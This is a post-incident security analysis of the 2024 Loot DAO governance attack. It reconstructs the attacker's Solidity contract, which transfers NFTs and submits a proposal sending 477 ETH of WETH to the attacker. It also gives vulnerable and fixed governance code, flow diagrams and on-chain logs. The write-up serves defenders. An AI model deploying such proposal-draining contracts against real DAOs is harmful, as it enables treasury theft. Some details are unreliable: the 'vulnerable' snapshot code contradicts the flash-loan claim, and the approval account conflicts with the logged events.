# Loot — Governance Attack (Flash Loan Vote Manipulation) Analysis

| Field | Details |
|------|------|
| **Date** | 2024-01-05 |
| **Protocol** | Loot DAO (Adventure Gold DAO) |
| **Chain** | Ethereum |
| **Loss** | ~$1,200,000 (477 ETH) — **actual theft prevented** by Phalcon intervention |
| **Attacker** | [0x469a...e189](https://etherscan.io/address/0x469a2f900ef0504299bfd4d1812618a94b67e189) |
| **Attack Contract** | [0xebba...e8c](https://etherscan.io/address/0xebba0f3e16ef2f5e87c38e49541b7ae3c7b78e8c) |
| **Attack Tx** | [0xbc8c...0556](https://etherscan.io/tx/0xbc8c30b7db136e97251eaa9897853ddf125f155b7c63bbe4c06d704384a40556) |
| **Vulnerable Contract** | [LootDAOProxy 0xcdb9...a786](https://etherscan.io/address/0xcdb9f8f9be143b7c72480185459ab9720462a786) |
| **Treasury Contract** | [LootDAOExecutor 0x8cFD...5a18](https://etherscan.io/address/0x8cFDF9E9f7EA8c0871025318407A6f1Fbc5d5a18) |
| **Root Cause** | Governance Attack — Missing Vote Token Locking (Flash Loan Vote Manipulation) |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs) (not listed in January index, reconstructed from on-chain analysis) |
| **Reference** | [BlockSec Phalcon Analysis](https://blocksec.com/blog/how-phlacon-block-helped-loot-block-1-m-usd-hack) |

---

## 1. Vulnerability Overview

Loot DAO operated an on-chain governance system based on **Loot ERC-721 NFT** holdings. The LootDAOProxy contract (`0xcdb9...a786`) implemented a Governor Bravo-style propose-vote-execute mechanism, where a proposal could pass with a minimum of 155 votes in favor (200 bps quorum) out of a total of 7,779 Loot NFTs.

**Core Vulnerability**: NFTs were not locked at the time of voting, making it possible to **borrow → vote → return** the same tokens repeatedly within a single transaction, enabling flash loan vote manipulation.

On January 5, 2024, the attacker (`0x469a...e189`) deployed a custom attack contract (`0xebba...e8c`) and:
1. **Transferred 8 Loot NFTs to the attack contract**, then used the voting power to create a malicious proposal (#5)
2. Proposal content: Call WETH `transfer()` to move **477 ETH (~$1.2M) held in LootDAOExecutor to the attacker-controlled address (`0x70670...065`)**
3. Phalcon immediately detected the proposal creation and alerted the Loot community
4. Community voted against the proposal, defeating proposal #5, and a follow-up security proposal (#6) moved the funds to a safe wallet

Attacker's intent: Flash-borrow Loot NFTs from NFTX → cast multiple repeat votes → meet 155-vote quorum → pass proposal and steal 477 ETH. However, Phalcon's detection and community response resulted in zero actual fund loss.

---

## 2. Vulnerable Code Analysis

### 2.1 Missing Vote Token Locking (Core Vulnerability)

Loot DAO governance's vote function calculated voting power based on NFT holdings, but **did not lock the voted tokens**.

#### ❌ Vulnerable Code (inferred — Governor Bravo family)

```solidity
// LootDAO Governor - castVote (vulnerable implementation)
function castVoteInternal(
    address voter,
    uint proposalId,
    uint8 support
) internal returns (uint96) {
    // Calculate voting power (number of NFTs held) at current block
    uint96 votes = loot.getPriorVotes(voter, proposals[proposalId].startBlock);
    
    // @audit ❌ Tokens are not locked after voting
    // @audit ❌ Same token can be transferred → re-voted from another address
    // @audit ❌ Tokens borrowed via flash loan are also counted as voting power
    
    Receipt storage receipt = proposals[proposalId].receipts[voter];
    require(receipt.hasVoted == false, "GovernorBravo::castVoteInternal: voter already voted");
    
    if (support == 0) {
        proposals[proposalId].againstVotes = add256(proposals[proposalId].againstVotes, votes);
    } else if (support == 1) {
        proposals[proposalId].forVotes = add256(proposals[proposalId].forVotes, votes);
    }
    
    receipt.hasVoted = true;
    receipt.support = support;
    receipt.votes = votes;
    
    return votes;
    // @audit ❌ Token can be transferred after return → same token can be re-voted from another address
}
```

#### ✅ Fixed Code

```solidity
// Fix 1: Lock token transfers during voting period (ERC-721 extension)
function castVoteInternal(
    address voter,
    uint proposalId,
    uint8 support
) internal returns (uint96) {
    Proposal storage proposal = proposals[proposalId];
    
    // ✅ Calculate voting power based on snapshot block (at time of deployment)
    uint96 votes = loot.getPriorVotes(voter, proposal.startBlock);
    
    Receipt storage receipt = proposal.receipts[voter];
    require(!receipt.hasVoted, "Already voted");
    
    // ✅ Record and lock voted NFT IDs
    uint256[] memory tokenIds = loot.getTokensOfOwner(voter);
    for (uint i = 0; i < tokenIds.length; i++) {
        require(!voteLocked[proposalId][tokenIds[i]], "Token already used for vote");
        voteLocked[proposalId][tokenIds[i]] = true;  // Block transfers during voting period
    }
    
    if (support == 1) {
        proposal.forVotes = add256(proposal.forVotes, votes);
    } else {
        proposal.againstVotes = add256(proposal.againstVotes, votes);
    }
    
    receipt.hasVoted = true;
    receipt.votes = votes;
    return votes;
}

// Fix 2: Snapshot at proposal creation + mandatory timelock
function propose(...) public returns (uint) {
    // ✅ Verify proposer minimum holding period (e.g., held for 30+ days)
    require(
        loot.getPriorVotes(msg.sender, block.number - HOLDING_PERIOD) >= proposalThreshold,
        "Must hold tokens for minimum period"
    );
    // ...
}
```

**Problem**: Governor Bravo-family governance calls `getPriorVotes(voter, startBlock)` to calculate voting power based on a snapshot block. However, there is no mechanism to prevent re-voting after NFT transfer (or return) from a different address or contract. In other words, a single NFT can be passed between multiple addresses for repeated voting, or a flash-borrowed NFT can be voted with immediately and returned.

---

### 2.2 Proposal Threshold Bypass (Secondary)

#### ❌ Vulnerable Code

```solidity
// @audit ❌ Proposal creation only checks current holdings, not holding period
function propose(
    address[] memory targets,
    uint[] memory values,
    string[] memory signatures,
    bytes[] memory calldatas,
    string memory description
) public returns (uint) {
    // Only checks current holdings (can be satisfied via short-term purchase/borrow)
    require(
        loot.getCurrentVotes(msg.sender) > proposalThreshold,
        "GovernorBravo::propose: proposer votes below proposal threshold"
    );
    // @audit ❌ Can create proposal after temporarily holding via flash loan
    // @audit ❌ No holding period requirement
    ...
}
```

#### ✅ Fixed Code

```solidity
// ✅ Prove holding for a set period (e.g., 13,140 blocks ≈ 2 days)
function propose(...) public returns (uint) {
    // Query snapshot voting power at current block - holding period blocks
    uint256 snapshotBlock = block.number - PROPOSAL_MIN_HOLDING_BLOCKS; // 13,140 blocks
    require(
        loot.getPriorVotes(msg.sender, snapshotBlock) > proposalThreshold,
        "Insufficient prior voting power (holding period not met)"
    );
    ...
}
```

---

### 2.3 Attack Contract Core Logic (Reconstructed from On-Chain Bytecode)

Core logic reconstructed from the bytecode of the deployed attack contract (`0xebba...e8c`):

```solidity
// Attack contract (reconstructed) — 0xebba0f3e16ef2f5e87c38e49541b7ae3c7b78e8c
contract LootAttacker {
    address public owner;  // = 0x469a2f900ef0504299bfd4d1812618a94b67e189 (tx.origin)
    
    // constructor executes immediately upon deployment
    constructor() {
        owner = tx.origin;
        
        // ① Step: Transfer 8 Loot NFTs to attack contract (approve + transferFrom)
        uint256[] memory tokenIds = [3474, 2416, 539, 1438, 1415, 2386, 383, 2102];
        for (uint i = 0; i < tokenIds.length; i++) {
            // safeTransferFrom(owner, attackContract, tokenId)
            LOOT.safeTransferFrom(tx.origin, address(this), tokenIds[i]);
        }
        
        // ② Step: Create proposal
        // Proposal content: WETH.transfer(0x70670b5...065, 477 ETH)
        // i.e., transfer 477 ETH from LootDAOExecutor to attacker's wallet
        _propose(
            governor,           // 0xcdb9f8f9be143b7c72480185459ab9720462a786
            0x70670b5ee954f9052353bf9dac5c8697f2e5c065  // recipient address
        );
    }
    
    function _propose(address governor, address recipient) internal {
        address[] memory targets = new address[](1);
        targets[0] = WETH;   // 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
        
        uint256[] memory values = new uint256[](1);
        values[0] = 0;
        
        string[] memory signatures = new string[](1);
        signatures[0] = "";
        
        bytes[] memory calldatas = new bytes[](1);
        // transfer(recipient, 477 ETH) = a9059cbb + recipient + amount
        calldatas[0] = abi.encodeWithSelector(
            IERC20.transfer.selector,
            recipient,
            477 ether  // 0x19dbb46cbee5540000
        );
        
        // @audit ❌ governor.propose() call — voting period begins
        IGovernor(governor).propose(targets, values, signatures, calldatas, "Proposal #5");
    }
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- The attacker had previously acquired 8 Loot NFTs (IDs: 3474, 2416, 539, 1438, 1415, 2386, 383, 2102)
- NFTs were purchased or borrowed via NFTX flash loan to meet the proposal threshold
- Attack plan: Flash-borrow large quantity of Loot NFTs from NFTX → cast repeated votes → reach 155 votes → pass proposal

### 3.2 Execution Phase

```
Block #18,941,483 (2024-01-05 13:51:47 UTC)

┌─────────────────────────────────────────────┐
│  Attacker (0x469a...e189)                    │
│  ↓ Deploy attack contract (CREATE)           │
└─────────────────────────────────────────────┘
                    │
                    ▼
┌─────────────────────────────────────────────┐
│  Attack contract constructor executes        │
│  (0xebba0f3e16ef2f5e87c38e49541b7ae3c7b78e8c) │
└─────────────────────────────────────────────┘
                    │
          ┌─────────┴──────────┐
          ▼                    ▼
┌──────────────────┐  ┌────────────────────────┐
│ Step 1: NFT      │  │ Step 2: Create Proposal │
│ Transfer         │  │                        │
│                  │  │ governor.propose() call │
│ Loot NFT x8 →   │  │ Proposal ID: #5         │
│ attack contract  │  │ Voting period:          │
│                  │  │ Block #18,954,623 ~      │
│ safeTransferFrom │  │       #18,974,333       │
│ (8 Transfer      │  │ (~19,710 blocks)         │
│  events emitted) │  │                        │
└──────────────────┘  └────────────────────────┘
                                │
                                ▼
              ┌─────────────────────────────────┐
              │ Proposal #5 Content:             │
              │                                 │
              │ target:  WETH contract           │
              │ calldata: transfer(             │
              │   0x70670b5e...065,  ← recipient │
              │   477 ETH           ← amount    │
              │ )                               │
              │                                 │
              │ If passed: LootDAOExecutor's     │
              │ 477 ETH → attacker's wallet      │
              └─────────────────────────────────┘
                                │
                                ▼
              ┌─────────────────────────────────┐
              │  Phalcon detection (13:51:47 UTC) │
              │  → 14:48 Twitter alert issued    │
              │  → 15:42 War room assembled      │
              └─────────────────────────────────┘
                                │
              ┌─────────────────┴──────────────┐
              ▼                                ▼
┌─────────────────────┐        ┌───────────────────────┐
│ Attacker Intent     │        │ Community Response     │
│ (not executed)      │        │                       │
│                     │        │ Vote against           │
│ Flash-borrow large  │        │ Proposal #5            │
│ Loot NFTs from NFTX │        │ (155-vote quorum       │
│ → attempt repeat    │        │  not reached)          │
│   votes             │        │                       │
│ → target 155 votes  │        │ Proposal #6 created:  │
│                     │        │ 477 ETH →             │
│ (flash loan voting  │        │ safe multisig          │
│  phase never        │        └───────────────────────┘
│  executed)          │
└─────────────────────┘
                                        │
                                        ▼
                        ┌───────────────────────────┐
                        │ Outcome (2024-01-10)       │
                        │ Proposal #5 defeated       │
                        │ 477 ETH successfully       │
                        │ protected                  │
                        │ ($1,200,000 loss prevented) │
                        └───────────────────────────┘
```

### 3.3 Attacker's Intended Flash Loan Vote Flow (Not Executed)

```
┌──────────────────────────────────────────────────────────┐
│  Flash Loan Vote Attack (planned flow, blocked by Phalcon) │
│                                                          │
│  ① Flash-borrow large quantity of Loot NFTs from NFTX   │
│     └─ within a single transaction                       │
│                                                          │
│  ② Call castVote(proposalId=5, support=FOR)             │
│     └─ NFTs held × 1 vote = for votes accumulated       │
│                                                          │
│  ③ Return NFTs to NFTX                                   │
│                                                          │
│  ④ Borrow another batch of NFTs and re-vote             │
│     └─ @audit ❌ Possible because no vote locking        │
│                                                          │
│  ⑤ Repeat until 155+ for votes achieved                 │
│                                                          │
│  ⑥ After proposal passes, execute() → steal 477 ETH    │
└──────────────────────────────────────────────────────────┘
```

### 3.4 Actual On-Chain Verified Outcome

- What the attacker actually executed: Deploy attack contract + create malicious proposal #5
- Flash loan repeat voting was not attempted after Phalcon detection
- Fund loss: **$0** (defense successful)

---

## 4. PoC Code Analysis (Reconstructed from On-Chain Bytecode)

No official DeFiHackLabs PoC exists, but the core logic has been reconstructed from the bytecode of the on-chain deployed attack contract.

```solidity
// Core logic reconstruction of attack contract deployment Tx
// Tx: 0xbc8c30b7...0556
// Block: #18,941,483

// Step 1: Deploy attack contract (attack executes immediately in constructor)
contract LootGovernanceAttacker {
    
    // Loot NFT contract
    IERC721 constant LOOT = IERC721(0xFF9C1b15B16263C61d017ee9F65C50e4AE0113D7);
    // Loot DAO Governor (Proxy)
    address constant GOVERNOR = 0xcdb9f8f9be143b7c72480185459ab9720462a786;
    // WETH
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    // Attacker's recipient address
    address constant RECIPIENT = 0x70670b5ee954f9052353bf9dac5c8697f2e5c065;
    // Amount of WETH held in LootDAOExecutor
    uint256 constant STEAL_AMOUNT = 477 ether; // 0x19dbb46cbee5540000

    constructor() {
        address owner = tx.origin; // attacker EOA
        
        // Step 2: Transfer 8 Loot NFTs to this contract
        // (attacker has pre-approved)
        uint256[8] memory tokenIds = [
            uint256(3474), 2416, 539, 1438, 1415, 2386, 383, 2102
        ];
        for (uint i = 0; i < 8; i++) {
            // @audit Approval + Transfer events emitted for each NFT
            LOOT.safeTransferFrom(owner, address(this), tokenIds[i]);
        }
        
        // Step 3: Create malicious proposal
        // Proposal content: send 477 WETH from LootDAOExecutor to RECIPIENT
        address[] memory targets = new address[](1);
        targets[0] = WETH;
        
        uint256[] memory values = new uint256[](1);
        values[0] = 0;
        
        string[] memory signatures = new string[](1);
        signatures[0] = ""; // use fallback
        
        bytes[] memory calldatas = new bytes[](1);
        // WETH.transfer(RECIPIENT, 477 ETH)
        calldatas[0] = abi.encodeWithSelector(
            IERC20.transfer.selector,
            RECIPIENT,
            STEAL_AMOUNT
        );
        
        // @audit ❌ governor.propose() call succeeds → Proposal #5 created
        // Voting period: Block #18,954,623 ~ #18,974,333 (~19,710 blocks ≈ 2.6 days)
        IGovernor(GOVERNOR).propose(
            targets,
            values,
            signatures,
            calldatas,
            "Transfer 477 ETH to recipient" // description
        );
        
        // Step 4 (intent): Flash loan repeat voting after proposal creation
        // Flash-borrow Loot NFTs from NFTX → repeat castVote → return to NFTX
        // → reach 155+ votes → pass proposal → execute() → steal 477 ETH
        // (In practice, Phalcon detection prevented this step from executing)
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Pattern Category |
|----|--------|--------|-----|---------------|
| V-01 | Missing Vote Token Locking (Flash Loan Vote) | CRITICAL | CWE-840 (Business Logic Error) | `14_governance.md` |
| V-02 | Proposer Holding Period Not Verified | HIGH | CWE-284 (Improper Access Control) | `03_access_control.md` |
| V-03 | Insufficient Fund Protection During Timelock Execution | HIGH | CWE-362 (Race Condition) | `14_governance.md` |

### V-01: Missing Vote Token Locking (Flash Loan Vote Manipulation)

- **Description**: Transfers of NFT tokens that have cast votes are not blocked during the voting period. The same NFT can be passed to another address for re-voting, or borrowed from a flash loan pool like NFTX → voted → returned, repeatedly within a single transaction or short period.
- **Impact**: A small number of NFTs can manipulate a majority of votes to satisfy quorum and pass malicious proposals. In the Loot case, an attempt was made to steal 477 ETH ($1.2M).
- **Attack Conditions**: (1) NFT transfers must be allowed during the voting period, (2) an NFT flash loan pool (NFTX, etc.) must exist, (3) quorum threshold must be low enough or achievable relative to total token supply.

### V-02: Proposer Holding Period Not Verified

- **Description**: The `propose()` function only checks voting power at the current or recent block without requiring a minimum holding period, allowing the proposal threshold to be satisfied via short-term purchase or flash loan.
- **Impact**: A malicious actor can temporarily acquire NFTs to create a proposal, then immediately sell or return them.
- **Attack Conditions**: Sufficient liquidity to short-term purchase/borrow governance tokens or NFTs.

### V-03: Insufficient Fund Protection During Timelock Execution

- **Description**: Once a proposal passes it executes through a timelock, but there was no emergency circuit-breaker mechanism to protect funds held by the DAO Executor during the timelock waiting period.
- **Impact**: Once a malicious proposal passes and the timelock expires, funds are drained without community intervention.
- **Attack Conditions**: A malicious proposal has passed.

---

## 6. Remediation Recommendations

### Immediate Actions

#### Implement Token Locking During Voting

```solidity
// Add to Governor contract
mapping(uint256 => mapping(uint256 => bool)) public tokenVoteLocked;
// proposalId => tokenId => locked

function castVoteInternal(
    address voter,
    uint proposalId,
    uint8 support
) internal returns (uint96) {
    Proposal storage proposal = proposals[proposalId];
    
    // Calculate voting power based on snapshot block (unchanged)
    uint96 votes = token.getPriorVotes(voter, proposal.startBlock);
    
    // ✅ Record and block reuse of voted token IDs
    uint256[] memory voterTokens = token.getTokensOwnedAt(voter, proposal.startBlock);
    for (uint i = 0; i < voterTokens.length; i++) {
        require(!tokenVoteLocked[proposalId][voterTokens[i]], "Token already voted");
        tokenVoteLocked[proposalId][voterTokens[i]] = true;
    }
    
    // Record vote (existing logic)
    Receipt storage receipt = proposal.receipts[voter];
    require(!receipt.hasVoted, "Already voted");
    receipt.hasVoted = true;
    receipt.votes = votes;
    
    if (support == 1) {
        proposal.forVotes += votes;
    } else if (support == 0) {
        proposal.againstVotes += votes;
    }
    
    return votes;
}
```

#### Require Minimum Proposer Holding Period

```solidity
function propose(...) public returns (uint) {
    // ✅ Check voting power at current block - 13,140 blocks (~2 days)
    uint256 snapshotBlock = block.number - 13140;
    require(snapshotBlock > 0, "Contract too new");
    
    require(
        token.getPriorVotes(msg.sender, snapshotBlock) > proposalThreshold,
        "Must hold tokens >= 2 days before proposing"
    );
    // ... existing logic
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Missing vote token locking | Block token transfers during voting period, or fix snapshot block and disregard current balance |
| Proposal threshold bypass | Require proposer to prove holding of 30+ days minimum (`getPriorVotes`) |
| Low quorum threshold | Raise quorum from 200 bps (155 votes) to 500 bps or higher |
| Insufficient timelock period | Mandate minimum 7-day timelock for proposals involving significant fund transfers |
| No emergency circuit-breaker | Add multisig-based Guardian/Vetoer authority (Loot had a vetoer but it wasn't activated promptly) |
| NFT flash loan vulnerability | Restrict voting rights for NFTs borrowed from flash loan pools like NFTX (use EIP-5805) |

---

## 7. Lessons Learned

1. **Always implement vote escrow for governance tokens**: Whether ERC-20 or ERC-721 based, tokens used in voting must have transfers blocked for the duration of that proposal's voting period. veToken (ve-model) or snapshot + lock combinations are the standard defense.

2. **Flash loans can be used for governance attacks too**: Flash loan attacks are not limited to AMM price manipulation. They can be applied anywhere there is balance-based logic — voting power, reward calculations, liquidation criteria, etc.

3. **On-chain monitoring is critical for defense**: Had Phalcon not detected the proposal creation transaction in real-time and alerted the community, the attacker could have attempted repeated voting during the ~2.6-day voting period and passed the proposal. Without BlockSec's detection, a $1.2M loss would likely have materialized.

4. **Design quorum thresholds carefully**: 200 bps (155 votes) was low enough to be achievable by flash-borrowing NFTs. The smaller the DAO, the stricter the quorum requirements should be — or thresholds should be adjusted based on community participation rate rather than absolute token counts.

5. **Actively utilize Guardian/Vetoer mechanisms**: Loot DAO had a vetoer function but it did not activate quickly enough. Emergency veto rights should be automated or integrated with on-chain monitoring systems.

6. **Similar Case — Beanstalk ($182M, April 2022)**: The same flash loan governance attack resulted in an actual $182M theft. Beanstalk also lacked vote token locking, and the attacker completed flash loan → vote → execute → return within a single transaction. Loot succeeded in defense thanks to Phalcon, but the vulnerability structure is identical.

---

## 8. On-Chain Verification

### 8.1 Transaction Basic Information

| Field | Value |
|------|-----|
| Tx Hash | `0xbc8c30b7db136e97251eaa9897853ddf125f155b7c63bbe4c06d704384a40556` |
| Block Number | `#18,941,483` |
| Attacker (from) | `0x469A2F900Ef0504299bfD4D1812618A94b67e189` ✅ match |
| Deployed Contract | `0xebba0f3e16ef2f5e87c38e49541b7ae3c7b78e8c` |
| Gas Used | 1,859,613 / 1,922,413 (96.73%) |
| Transaction Type | CONTRACT_CREATION (attack contract deployment) |
| Status | SUCCESS (`0x1`) |

### 8.2 On-Chain Event Log Sequence (18 total)

| Order | Event | Contract | Details |
|------|--------|----------|-----------|
| Log 0 | `Approval` | Loot NFT | Attacker → zero address approval revocation, NFT #3474 |
| Log 1 | `Transfer` | Loot NFT | #3474: attacker → attack contract |
| Log 2 | `Approval` | Loot NFT | NFT #2416 |
| Log 3 | `Transfer` | Loot NFT | #2416: attacker → attack contract |
| Log 4-5 | Approval+Transfer | Loot NFT | #539 transfer |
| Log 6-7 | Approval+Transfer | Loot NFT | #1438 transfer |
| Log 8-9 | Approval+Transfer | Loot NFT | #1415 transfer |
| Log 10-11 | Approval+Transfer | Loot NFT | #2386 transfer |
| Log 12-13 | Approval+Transfer | Loot NFT | #383 transfer |
| Log 14-15 | Approval+Transfer | Loot NFT | #2102 transfer |
| **Log 16** | **`ProposalCreated`** | LootDAOProxy | **Proposal #5 created** |
| **Log 17** | `ProposalCreatedWithRequirements` | LootDAOProxy | **Proposal requirements recorded** |

### 8.3 Proposal #5 On-Chain Details

| Field | On-Chain Value |
|------|----------|
| Proposal ID | `5` |
| Proposer | `0xebba0f3e16ef2f5e87c38e49541b7ae3c7b78e8c` (attack contract) |
| Target Contract | `0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2` (WETH) |
| Called Function | `transfer(address,uint256)` (`0xa9059cbb`) |
| Recipient | `0x70670b5ee954f9052353bf9dac5c8697f2e5c065` |
| Transfer Amount | **477 ETH** (`0x19dbb46cbee5540000`) |
| Vote Start Block | `#18,954,623` |
| Vote End Block | `#18,974,333` |
| Voting Period | 19,710 blocks (~2.6 days) |
| Quorum Threshold | 155 votes (200 bps of 7,779 total NFTs) |

### 8.4 PoC Analysis vs. Actual On-Chain Values Comparison

| Field | Analysis Value | On-Chain Actual | Match |
|------|--------|-------------|-----------|
| Attacker address | `0x469a...e189` | `0x469A...e189` | ✅ match |
| Target steal amount | 477 ETH ($1.2M) | 477 ETH | ✅ match |
| Proposal number | #5 | `5` | ✅ match |
| NFTs used | 8 | 8 (Log 1,3,5,7,9,11,13,15) | ✅ match |
| Governor address | `0xcdb9...a786` | `0xcdb9f8f9be143b7c72480185459ab9720462a786` | ✅ match |
| Recipient address | `0x70670...065` | `0x70670b5ee954f9052353bf9dac5c8697f2e5c065` | ✅ match |

### 8.5 Precondition Verification

The attack Tx was included in block `#18,941,483`. Prior to this block:
- The attacker EOA held 8 Loot NFTs (the from address in Transfer logs matches the attacker)
- safeTransferFrom to the attack contract was executed directly without an Approval (executed by the NFT owner themselves)
- LootDAOExecutor held more than 477 ETH worth of WETH

---

*This document was prepared based on the BlockSec Phalcon blog analysis and on-chain transaction data (`cast` Foundry CLI).*

*Reference: [Blocked Loot Attack — BlockSec Blog](https://blocksec.com/blog/how-phlacon-block-helped-loot-block-1-m-usd-hack)*